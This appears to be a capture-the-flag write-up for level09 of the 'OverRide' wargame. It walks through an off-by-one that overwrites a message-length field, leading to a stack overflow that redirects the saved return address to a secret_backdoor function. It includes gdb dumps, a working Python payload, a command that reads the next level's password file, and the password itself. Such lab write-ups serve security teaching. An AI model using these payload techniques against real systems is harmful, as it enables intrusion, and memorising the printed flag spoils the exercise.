For this exercise we have an "interface" which asks us for a username and then a message.
let's try to make segfault.


level09@OverRide:~$ ./level09 
--------------------------------------------
|   ~Welcome to l33t-m$n ~    v1337        |
--------------------------------------------
>: Enter your username
>>: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
>: Welcome, AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA>: Msg @Unix-Dude
>>: >: Msg sent!
level09@OverRide:~$ ./level09 
--------------------------------------------
|   ~Welcome to l33t-m$n ~    v1337        |
--------------------------------------------
>: Enter your username
>>: AAAA
>: Welcome, AAAA
>: Msg @Unix-Dude

>: Msg sent!


Ok for now it's impossible. Let's analysis the asm code.

Dump of assembler code for function handle_msg:
		....
   0x00000000000008cb <+11>:	lea    -0xc0(%rbp),%rax
   0x00000000000008d2 <+18>:	add    $0x8c,%rax
   0x00000000000008d8 <+24>:	movq   $0x0,(%rax)
   0x00000000000008df <+31>:	movq   $0x0,0x8(%rax)
   0x00000000000008e7 <+39>:	movq   $0x0,0x10(%rax)
   0x00000000000008ef <+47>:	movq   $0x0,0x18(%rax)
   0x00000000000008f7 <+55>:	movq   $0x0,0x20(%rax)
   0x00000000000008ff <+63>:	movl   $0x8c,-0xc(%rbp)
		....

Let's look this buffer after file it.

(gdb) disass
Dump of assembler code for function handle_msg:
		....
   0x000055555555491f <+95>:	callq  0x555555554932 <set_msg>
=> 0x0000555555554924 <+100>:	lea    0x295(%rip),%rdi        # 0x555555554bc0
   0x000055555555492b <+107>:	callq  0x555555554730 <puts@plt>
   0x0000555555554930 <+112>:	leaveq 
   0x0000555555554931 <+113>:	retq   
End of assembler dump.

(gdb) x/100wx $rbp -0xc0
0x7fffffffe500:	0x42424242	0x42424242	0x0000000a	0x00000000	<---- This is our msg | 0x7fffffffe58c - 0x7fffffffe500 = 0x8c
0x7fffffffe510:	0x00000000	0x00000000	0x00000000	0x00000000		so we have 0x8c = 140 bit size
0x7fffffffe520:	0x00000000	0x00000000	0x00000000	0x00000000
0x7fffffffe530:	0x00000000	0x00000000	0x00000000	0x00000000
0x7fffffffe540:	0x00000000	0x00000000	0x00000000	0x00000000
0x7fffffffe550:	0x00000000	0x00000000	0x00000000	0x00000000
0x7fffffffe560:	0x00000000	0x00000000	0x00000000	0x00000000
0x7fffffffe570:	0x00000000	0x00000000	0x00000000	0x00000000
0x7fffffffe580:	0x00000000	0x00000000	0x00000000	0x41414141	<---- This is our username | 0x7fffffffe5b4 - 0x7fffffffe58c = 0x28 
0x7fffffffe590:	0x41414141	0x0000000a	0x00000000	0x00000000		so we have 0x28 = 40 bit size
0x7fffffffe5a0:	0x00000000	0x00000000	0x00000000	0x00000000
0x7fffffffe5b0:	0x00000000	0x0000008c	0xffffe5d0	0x00007fff	<---- And this is a value set for size msg in handle_msg

let's now look how string are take.

For username:

   0x0000555555554a23 <+86>:	mov    (%rax),%rax
   0x0000555555554a26 <+89>:	mov    %rax,%rdx
   0x0000555555554a29 <+92>:	lea    -0x90(%rbp),%rax
   0x0000555555554a30 <+99>:	mov    $0x80,%esi
   0x0000555555554a35 <+104>:	mov    %rax,%rdi
   0x0000555555554a38 <+107>:	callq  0x555555554770 <fgets@plt>    		<---- here a simple fgets with 0x80 = 128 bit size.
   0x0000555555554a3d <+112>:	movl   $0x0,-0x4(%rbp)

   0x0000555555554a44 <+119>:	jmp    0x555555554a6a <set_username+157>	<---- And here a loop for past buffer
   0x0000555555554a46 <+121>:	mov    -0x4(%rbp),%eax
   0x0000555555554a49 <+124>:	cltq   
   0x0000555555554a4b <+126>:	movzbl -0x90(%rbp,%rax,1),%ecx
   0x0000555555554a53 <+134>:	mov    -0x98(%rbp),%rdx
   0x0000555555554a5a <+141>:	mov    -0x4(%rbp),%eax
   0x0000555555554a5d <+144>:	cltq   
   0x0000555555554a5f <+146>:	mov    %cl,0x8c(%rdx,%rax,1)
   0x0000555555554a66 <+153>:	addl   $0x1,-0x4(%rbp)
   0x0000555555554a6a <+157>:	cmpl   $0x28,-0x4(%rbp)				<---- loop size is 0x28
   0x0000555555554a6e <+161>:	jg     0x555555554a81 <set_username+180>	<---- Jump when cmp is greater of 0x28, OH so he take one char too much!

Ok so we can send 41 and not 40 char for username, so we can overwrite the size of msg!

let's look set_msg quickly.

   0x0000555555554981 <+79>:	mov    0x201630(%rip),%rax        # 0x555555755fb8
   0x0000555555554988 <+86>:	mov    (%rax),%rax
   0x000055555555498b <+89>:	mov    %rax,%rdx
   0x000055555555498e <+92>:	lea    -0x400(%rbp),%rax
   0x0000555555554995 <+99>:	mov    $0x400,%esi
   0x000055555555499a <+104>:	mov    %rax,%rdi
   0x000055555555499d <+107>:	callq  0x555555554770 <fgets@plt>		<---- Simple fgets with 0x400 = 1024bits size.
   0x00005555555549a2 <+112>:	mov    -0x408(%rbp),%rax
   0x00005555555549a9 <+119>:	mov    0xb4(%rax),%eax
   0x00005555555549af <+125>:	movslq %eax,%rdx
   0x00005555555549b2 <+128>:	lea    -0x400(%rbp),%rcx
   0x00005555555549b9 <+135>:	mov    -0x408(%rbp),%rax
   0x00005555555549c0 <+142>:	mov    %rcx,%rsi
   0x00005555555549c3 <+145>:	mov    %rax,%rdi
   0x00005555555549c6 <+148>:	callq  0x555555554720 <strncpy@plt>		<---- And strncpy, with buf and -0x408(%rbp) of size of ?

Breakpoint 1, 0x00005555555549c6 in set_msg ()
(gdb) i r
rax            0x7fffffffe500	140737488348416
rbx            0x0	0
rcx            0x7fffffffe0f0	140737488347376
rdx            0x8c	140							<---- Size is 0x8c
		....

(gdb) x $rax + 0xb4
0x7fffffffe5b4:	0x0000008c							<---- He take size here

(gdb) x 0x7fffffffe500
0x7fffffffe500:	0x0000000a							<---- 0a = /n in ascii
(gdb) x 0x7fffffffe0f0 
0x7fffffffe0f0:	0x42424242							<---- Our buffer

Let's see if our theory is true with 40 B and 1 C

(gdb) r
Starting program: /home/users/level09/level09 
--------------------------------------------
|   ~Welcome to l33t-m$n ~    v1337        |
--------------------------------------------
>: Enter your username
>>: BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBC
>: Welcome, BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBC>: Msg @Unix-Dude
>>: AAAA

Breakpoint 1, 0x00005555555549c6 in set_msg ()
(gdb) x $rax + 0xb4
0x7fffffffe5b4:	0x00000043
(gdb) i r
rax            0x7fffffffe500	140737488348416
rbx            0x0	0
rcx            0x7fffffffe0f0	140737488347376
rdx            0x43	67							<---- Yes it's work

So we have control of size of the msg!
Now let's find what size we need to potentially replace rip.
We need to know where is rip.

Dump of assembler code for function handle_msg:
=> 0x0000555555554931 <+113>:	retq   

(gdb) info frame
Stack level 0, frame at 0x7fffffffe5c8:
 rip = 0x555555554931 in handle_msg; saved rip 0x555555554abd
 called by frame at 0x7fffffffe5e0
 Arglist at 0x7fffffffe5d0, args: 
 Locals at 0x7fffffffe5d0, Previous frame's sp is 0x7fffffffe5d0
 Saved registers:
  rip at 0x7fffffffe5c8

(gdb) x $rsp
0x7fffffffe5c8:	0x55554abd


Ok so rip is stored at 0x7fffffffe5c8.
let's check were is it.


0x7fffffffe500:	0x42424242	0x42424242	0x42424242	0x42424242	<---- Msg
0x7fffffffe510:	0x42424242	0x42424242	0x42424242	0x42424242
0x7fffffffe520:	0x42424242	0x42424242	0x42424242	0x42424242
0x7fffffffe530:	0x42424242	0x42424242	0x42424242	0x42424242
0x7fffffffe540:	0x42424242	0x42424242	0x42424242	0x42424242
0x7fffffffe550:	0x42424242	0x42424242	0x42424242	0x42424242
0x7fffffffe560:	0x42424242	0x42424242	0x42424242	0x42424242
0x7fffffffe570:	0x42424242	0x42424242	0x42424242	0x42424242
0x7fffffffe580:	0x42424242	0x42424242	0x42424242	0x41414141	<---- Username
0x7fffffffe590:	0x41414141	0x41414141	0x41414141	0x41414141	
0x7fffffffe5a0:	0x41414141	0x41414141	0x41414141	0x41414141
0x7fffffffe5b0:	0x00000a41	0x0000008c	0xffffe5d0	0x00007fff	<---- Size msg
0x7fffffffe5c0:	0xffffe5d0	0x00007fff	0x55554abd	0x00005555	<---- rsp is here
0x7fffffffe5d0:	0x00000000	0x00000000	0xf7a3d7ed	0x00007fff
0x7fffffffe5e0:	0x00000000	0x00000000	0xffffe6b8	0x00007fff
0x7fffffffe5f0:	0x55554000	0x00000001	0x55554aa8	0x00005555
0x7fffffffe600:	0x00000000	0x00000000	0x013f6513	0x5ad0a198


adress end of rip address	- buf msg start			= size we need for replace rip
0x7fffffffe5cf 			- 0x7fffffffe500		= 0xcf

So let's try with gdb to see.

python -c 'print "A" * 40 + "\xcf" +"\n"+ "B" * 200 + "\x8c\x48\x55\x55\x55\x55\x00\x00"' > /tmp/input

this is our buffer:

(gdb) x/100wx $rbp -0xc0
0x7fffffffe500:	0x42424242	0x42424242	0x42424242	0x42424242
0x7fffffffe510:	0x42424242	0x42424242	0x42424242	0x42424242
0x7fffffffe520:	0x42424242	0x42424242	0x42424242	0x42424242
0x7fffffffe530:	0x42424242	0x42424242	0x42424242	0x42424242
0x7fffffffe540:	0x42424242	0x42424242	0x42424242	0x42424242
0x7fffffffe550:	0x42424242	0x42424242	0x42424242	0x42424242
0x7fffffffe560:	0x42424242	0x42424242	0x42424242	0x42424242
0x7fffffffe570:	0x42424242	0x42424242	0x42424242	0x42424242
0x7fffffffe580:	0x42424242	0x42424242	0x42424242	0x42424242
0x7fffffffe590:	0x42424242	0x42424242	0x42424242	0x42424242
0x7fffffffe5a0:	0x42424242	0x42424242	0x42424242	0x42424242
0x7fffffffe5b0:	0x42424242	0x42424242	0x42424242	0x42424242
0x7fffffffe5c0:	0x42424242	0x42424242	0x5555488c	0x00005555
0x7fffffffe5d0:	0x00000000	0x00000000	0xf7a3d7ed	0x00007fff

if i print last rip:
(gdb) x 0x7fffffffe5c8
0x7fffffffe5c8:	0x5555488c
We have a secret_backdoor adresse.

And info frame on last line:

gdb) info frame
Stack level 0, frame at 0x7fffffffe5c8:
 rip = 0x555555554931 in handle_msg; saved rip 0x55555555488c

Next rip is a good adress !

We need to keep stdin open so we add '-' after cat file.

level09@OverRide:~$ python -c 'print "A" * 40 + "\xcf" +"\n"+ "B" * 200 + "\x8c\x48\x55\x55\x55\x55\x00\x00"' > /tmp/input && cat /tmp/input - |  ./level09 
--------------------------------------------
|   ~Welcome to l33t-m$n ~    v1337        |
--------------------------------------------
>: Enter your username
>>: >: Welcome, AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA�>: Msg @Unix-Dude
>>: >: Msg sent!
cat /home/users/end/.pass
j4AunAPDXaJxxWjYEUxpanmvSgRDV3tpA5BEaBuE

